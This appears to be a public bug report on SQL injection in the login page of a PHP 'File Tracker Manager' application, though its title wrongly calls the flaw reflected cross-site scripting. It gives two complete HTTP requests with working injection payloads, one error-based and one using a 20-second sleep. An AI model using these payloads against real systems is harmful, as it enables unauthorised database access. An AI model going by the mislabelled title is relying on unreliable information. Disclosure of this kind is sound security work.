# File Tracker Manager System v1.0 has Cross-site scripting (reflected)

BUG_Author: godownio

Website source address:https://www.sourcecodester.com/php/11510/file-tracker-manager.html

Vulnerability File: /file_manager/login.php

POST parameter 'username' exists SQL injection vulnerability

Payload1: username=a'&password=b

```
POST /file_manager/login.php HTTP/1.1
Host: 192.168.0.107
Content-Length: 22
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.107
Referer: http://192.168.0.107/file_manager/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

username=a'&password=b
```

An error occurred in the sql statement

![image](https://github.com/godownio/bug_report/blob/main/vendors/pictures/sql1.png)

Payload2:username=a' and (select 1 from (select(sleep(20)))a)-- a&password=b

```
POST /file_manager/login.php HTTP/1.1
Host: 192.168.0.107
Content-Length: 67
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.107
Referer: http://192.168.0.107/file_manager/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

username=a' and (select 1 from (select(sleep(20)))a)-- a&password=b
```

Server response time is 20 seconds

![image](https://github.com/godownio/bug_report/blob/main/vendors/pictures/sql2.png)
